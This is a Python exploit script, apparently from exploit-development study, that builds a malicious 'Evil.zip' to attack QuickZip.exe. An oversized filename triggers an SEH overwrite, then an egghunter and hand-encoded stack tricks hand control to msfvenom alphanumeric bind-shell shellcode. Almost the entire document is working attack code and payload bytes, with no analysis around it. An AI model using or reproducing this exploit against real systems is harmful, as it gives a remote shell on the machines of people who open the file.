#!/usr/bin/python

#root@kali:~# msfvenom -p windows/shell_bind_tcp -b '\x00\x0a\x0d' -e x86/alpha_mixed BufferRegister=EDI -f python -v shellcode 
#Payload size: 710 bytes
shellcode =  "T00WT00W"
shellcode += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x59\x6c\x58\x68\x4c\x42\x53\x30"
shellcode += "\x35\x50\x65\x50\x55\x30\x6d\x59\x38\x65\x56\x51"
shellcode += "\x79\x50\x73\x54\x6c\x4b\x46\x30\x36\x50\x6c\x4b"
shellcode += "\x56\x32\x44\x4c\x6e\x6b\x70\x52\x44\x54\x4c\x4b"
shellcode += "\x44\x32\x44\x68\x66\x6f\x68\x37\x33\x7a\x47\x56"
shellcode += "\x74\x71\x4b\x4f\x4c\x6c\x55\x6c\x53\x51\x51\x6c"
shellcode += "\x76\x62\x44\x6c\x67\x50\x4b\x71\x68\x4f\x44\x4d"
shellcode += "\x67\x71\x4f\x37\x59\x72\x7a\x52\x62\x72\x76\x37"
shellcode += "\x4e\x6b\x52\x72\x74\x50\x6e\x6b\x62\x6a\x57\x4c"
shellcode += "\x6c\x4b\x50\x4c\x77\x61\x30\x78\x38\x63\x67\x38"
shellcode += "\x76\x61\x5a\x71\x52\x71\x6c\x4b\x51\x49\x77\x50"
shellcode += "\x45\x51\x49\x43\x6e\x6b\x71\x59\x76\x78\x4d\x33"
shellcode += "\x37\x4a\x37\x39\x6c\x4b\x55\x64\x6e\x6b\x36\x61"
shellcode += "\x4b\x66\x34\x71\x49\x6f\x6e\x4c\x4b\x71\x78\x4f"
shellcode += "\x44\x4d\x73\x31\x48\x47\x64\x78\x6b\x50\x74\x35"
shellcode += "\x68\x76\x54\x43\x71\x6d\x69\x68\x45\x6b\x63\x4d"
shellcode += "\x54\x64\x52\x55\x4d\x34\x76\x38\x6e\x6b\x32\x78"
shellcode += "\x56\x44\x67\x71\x48\x53\x52\x46\x4e\x6b\x76\x6c"
shellcode += "\x30\x4b\x6c\x4b\x62\x78\x67\x6c\x47\x71\x6b\x63"
shellcode += "\x6e\x6b\x77\x74\x4c\x4b\x66\x61\x6a\x70\x4b\x39"
shellcode += "\x53\x74\x76\x44\x56\x44\x63\x6b\x51\x4b\x35\x31"
shellcode += "\x76\x39\x62\x7a\x33\x61\x39\x6f\x49\x70\x43\x6f"
shellcode += "\x61\x4f\x62\x7a\x6c\x4b\x62\x32\x7a\x4b\x4c\x4d"
shellcode += "\x43\x6d\x70\x68\x76\x53\x37\x42\x45\x50\x45\x50"
shellcode += "\x63\x58\x74\x37\x72\x53\x46\x52\x61\x4f\x66\x34"
shellcode += "\x30\x68\x70\x4c\x71\x67\x74\x66\x36\x67\x6b\x4f"
shellcode += "\x38\x55\x4f\x48\x6c\x50\x33\x31\x75\x50\x67\x70"
shellcode += "\x34\x69\x4b\x74\x31\x44\x62\x70\x42\x48\x54\x69"
shellcode += "\x4b\x30\x62\x4b\x63\x30\x39\x6f\x78\x55\x33\x5a"
shellcode += "\x46\x68\x46\x39\x66\x30\x38\x62\x4b\x4d\x61\x50"
shellcode += "\x30\x50\x47\x30\x46\x30\x65\x38\x68\x6a\x54\x4f"
shellcode += "\x69\x4f\x6b\x50\x59\x6f\x6b\x65\x6f\x67\x55\x38"
shellcode += "\x44\x42\x65\x50\x66\x71\x63\x6c\x4b\x39\x4a\x46"
shellcode += "\x33\x5a\x42\x30\x32\x76\x43\x67\x55\x38\x6a\x62"
shellcode += "\x69\x4b\x56\x57\x33\x57\x49\x6f\x78\x55\x73\x67"
shellcode += "\x31\x78\x6e\x57\x58\x69\x57\x48\x39\x6f\x79\x6f"
shellcode += "\x69\x45\x43\x67\x70\x68\x54\x34\x7a\x4c\x45\x6b"
shellcode += "\x78\x61\x69\x6f\x4b\x65\x63\x67\x6a\x37\x65\x38"
shellcode += "\x42\x55\x52\x4e\x72\x6d\x30\x61\x79\x6f\x6b\x65"
shellcode += "\x35\x38\x52\x43\x30\x6d\x71\x74\x67\x70\x4b\x39"
shellcode += "\x6b\x53\x31\x47\x62\x77\x31\x47\x76\x51\x49\x66"
shellcode += "\x33\x5a\x57\x62\x31\x49\x73\x66\x6d\x32\x6b\x4d"
shellcode += "\x53\x56\x69\x57\x73\x74\x67\x54\x55\x6c\x35\x51"
shellcode += "\x45\x51\x6c\x4d\x73\x74\x51\x34\x52\x30\x5a\x66"
shellcode += "\x45\x50\x42\x64\x71\x44\x42\x70\x32\x76\x53\x66"
shellcode += "\x50\x56\x47\x36\x36\x36\x50\x4e\x52\x76\x32\x76"
shellcode += "\x50\x53\x73\x66\x62\x48\x43\x49\x4a\x6c\x37\x4f"
shellcode += "\x6c\x46\x79\x6f\x4b\x65\x4c\x49\x59\x70\x30\x4e"
shellcode += "\x42\x76\x32\x66\x39\x6f\x50\x30\x51\x78\x74\x48"
shellcode += "\x6f\x77\x45\x4d\x35\x30\x49\x6f\x4e\x35\x6d\x6b"
shellcode += "\x6c\x30\x58\x35\x4e\x42\x46\x36\x73\x58\x6f\x56"
shellcode += "\x6f\x65\x6f\x4d\x4f\x6d\x69\x6f\x7a\x75\x65\x6c"
shellcode += "\x37\x76\x71\x6c\x45\x5a\x6d\x50\x79\x6b\x4b\x50"
shellcode += "\x33\x45\x46\x65\x6d\x6b\x57\x37\x56\x73\x64\x32"
shellcode += "\x52\x4f\x63\x5a\x47\x70\x51\x43\x49\x6f\x4a\x75"
shellcode += "\x41\x41"

####################### ZIP File Structure ######################## 
###################################################################
######################## Local File Header ########################
LocalFileHeader  = '\x50\x4b\x03\x04' # local file header signature
LocalFileHeader += '\x14\x00'         # version needed to extract 0x14 = 20 -> 2.0
LocalFileHeader += '\x00\x00'         # general purpose bit flag
LocalFileHeader += '\x00\x00'         # compression method
LocalFileHeader += '\xb7\xac'         # file last modification time 0xacb7 -> H=21 M=37 S=23 -> 21:37:23
LocalFileHeader += '\xce\x34'         # file last modification date 0x34ce -> D=3 M=6 Y=2006 -> 2006/6/3
LocalFileHeader += '\x00\x00\x00'     # CRC-32 '\x00' was left out to make sure we hit 25 bytes before file length
LocalFileHeader += '\x00\x00\x00\x00' # compressed size
LocalFileHeader += '\x00\x00\x00\x00' # uncompressed size
LocalFileHeader += '\xe4\x0f'         # file name length 0x0fe4 = 4068 bytes 
LocalFileHeader += '\x00\x00'         # extra field length
LocalFileHeader += '\x00'             # file name
#LocalFileHeader += '\x00'             # extra filed 
################## Central Directory File Header ##################
CDFileHeader     = '\x50\x4b\x01\x02' # cd file header signature 
CDFileHeader    += '\x14\x00'         # version made by 0x14 = 20 -> 2.0
CDFileHeader    += '\x14\x00'         # version needed to extract 0x14 = 20 -> 2.0
CDFileHeader    += '\x00\x00'         # general purpose bit flag
CDFileHeader    += '\x00\x00'         # compression method 
CDFileHeader    += '\xb7\xac'         # file last modification time 0xacb7 -> H=21 M=37 S=23 -> 21:37:23
CDFileHeader    += '\xce\x34'         # file last modification date 0x34ce -> D=3 M=6 Y=2006 -> 2006/6/3
CDFileHeader    += '\x00\x00\x00\x00' # CRC-32
CDFileHeader    += '\x00\x00\x00\x00' # compressed size
CDFileHeader    += '\x00\x00\x00\x00' # uncompressed size
CDFileHeader    += '\xe4\x0f'         # file name length 0x0fe4 = 4068 bytes
CDFileHeader    += '\x00\x00'         # extra field length
CDFileHeader    += '\x00\x00'         # file comment length 
CDFileHeader    += '\x00\x00'         # disk number where file starts
CDFileHeader    += '\x01\x00'         # internal file attributes BIT 0: apparent ASCII/text file
CDFileHeader    += '\x24\x00\x00\x00' # external file attributes 
CDFileHeader    += '\x00\x00\x00\x00' # relative offset of local file header
#CDFileHeader    += '\x00'             # file name
#CDFileHeader    += '\x00'             # extra field 
#CDFileHeader    += '\x00'             # file comment 
################ End of Central Directory Record ##################
EOCDRHeader      = '\x50\x4b\x05\x06' # End of central directory signature
EOCDRHeader     += '\x00\x00'         # number of this disk 
EOCDRHeader     += '\x00\x00'         # disk where central directory starts 
EOCDRHeader     += '\x01\x00'         # number of central directory records on this disk 
EOCDRHeader     += '\x01\x00'         # total number of central directory records 
EOCDRHeader     += '\x12\x10\x00\x00' # size of central directory (4114 bytes)
EOCDRHeader     += '\x02\x10\x00\x00' # offset of start of central directory, relative to start of archive 
EOCDRHeader     += '\x00\x00'         # comment length 
#EOCDRHeader     += '\x00'             # comment 

#root@kali:~# msfvenom -a x86 --platform windows -e x86/alpha_mixed BufferRegister=EAX -b '\x00' < /opt/OSCE/Tools/EggHunter.bin 
#Payload size: 118 bytes
EggHunter = 'PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJISVoqkzYovoPBCbbJDBqHzm6NuldECj3DhoLxBtdpfPaGNkijLoT5kZlobUywkOxgAA'

Evil  = '\x41' * 10                   # filler to egghunter  
Evil += EggHunter                     # hunt baby hunt!
Evil += '\x42' * 47                   # filler to the start of hand crafted shellcode
Evil += '\x54'                        # PUSH ESP                * save stack pointer 
Evil += '\x5F'                        # POP EDI                 * point eax to where we want to decode otherwise bad shellcode 
Evil += '\x54'                        # push   esp
Evil += '\x58'                        # pop    eax
Evil += '\x05\x21\x13\x11\x11'        # add    eax,0x11111321
Evil += '\x05\x21\x16\x11\x11'        # add    eax,0x11111621
Evil += '\x2d\x06\x23\x22\x22'        # sub    eax,0x22222306 
Evil += '\x50'                        # PUSH EAX
Evil += '\x5C'                        # POP ESP                 * move eax value into stack pointer  
Evil += '\x25\x4A\x4D\x4E\x55'        # AND EAX,554E4D4A        * decode 'mov esp, edi;jmp eax'
Evil += '\x25\x35\x32\x31\x2A'        # AND EAX,2A313235
Evil += '\x05\x44\x76\x77\x61'        # ADD EAX,61777644
Evil += '\x05\x44\x65\x66\x51'        # ADD EAX,51666544
Evil += '\x05\x34\x54\x55\x61'        # ADD EAX,61555434
Evil += '\x2D\x33\x33\x33\x33'        # SUB EAX,33333333
Evil += '\x50'                        # PUSH EAX
Evil += '\x25\x4A\x4D\x4E\x55'        # AND EAX,554E4D4A        * point eax to egg hunter shellcode 
Evil += '\x25\x35\x32\x31\x2A'        # AND EAX,2A313235
Evil += '\x05\x71\x75\x11\x11'        # ADD EAX,11117571
Evil += '\x05\x71\x75\x11\x11'        # ADD EAX,11117571
Evil += '\x05\x11\x35\x11\x11'        # ADD EAX,11113511
Evil += '\x2D\x13\x25\x21\x33'        # SUB EAX,33212513
Evil += '\x41' * (294-10-len(EggHunter)-47-82)
Evil += '\x75\x9f\x74\x9f'            # nSEH JZ & JNZ (aka jump net)
Evil += '\x41\x16\x40\x00'            # SEH pop esi,pop ebx, retn in QuickZip.exe 
Evil += shellcode                     # egg + shellcode     
Evil += '\x41' * (4064-294-4-4-len(shellcode))
Evil += '.txt'

buffer  = LocalFileHeader
buffer += Evil
buffer += CDFileHeader
buffer += Evil
buffer += EOCDRHeader  

try:
	f=open("Evil.zip","w")
	print "[+] Creating %s bytes evil payload.." %len(Evil)
	f.write(buffer)
	f.close()
	print "[+] File created!"
except Exception as e:
	print e